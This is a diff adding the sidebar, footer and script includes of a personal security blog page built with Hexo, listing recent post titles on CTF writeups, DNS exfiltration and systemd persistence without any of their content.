+			<li><a href="/project/tags/dns/">dns<span>1</span></a></li>
+		
+			<li><a href="/project/tags/walkthrough/">walkthrough<span>1</span></a></li>
+		
+			<li><a href="/project/tags/web-security/">web-security<span>2</span></a></li>
+		
+			<li><a href="/project/tags/tryhackme/">tryhackme<span>2</span></a></li>
+		
+		 
+		</ul>
+	</div>
+
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/project/2026/07/16/2026-07-16-reversing/"  title="A documentation of my early steps learning to reverse engineer" ><i class="fa fa-file-o"></i>HackTheBox - Cyberpsychosis...</a>
+      </li>
+    
+      <li>
+        <a href="/project/2026/07/13/2026-07-13-dns-data-exfil/"  title="A short showcase of how DNS can be abused as a data exfiltration channel." ><i class="fa fa-file-o"></i>Data Exfiltration by Abusin...</a>
+      </li>
+    
+      <li>
+        <a href="/project/2026/06/27/2026-06-27-abusing-system-services/"  title="A short showcase of user-level persistence through systemd user services on a Linux host." ><i class="fa fa-file-o"></i>Persistence by Abusing syst...</a>
+      </li>
+    
+      <li>
+        <a href="/project/2026/06/04/2026-06-04-silentium/"  title="Writeup for Silentium CTF." ><i class="fa fa-file-o"></i>Silentium - CTF Writeup</a>
+      </li>
+    
+      <li>
+        <a href="/project/2026/05/31/2026-05-31-principal/"  title="Writeup for Principal CTF." ><i class="fa fa-file-o"></i>Principal - CTF Writeup</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 zerrox9's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/project/js/jquery.imagesloaded.min.js"></script>
+<script src="/project/js/gallery.js"></script>
+<script src="/project/js/bootstrap.min.js"></script>
+<script src="/project/js/main.js"></script>
+<script src="/project/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/project/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/project/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
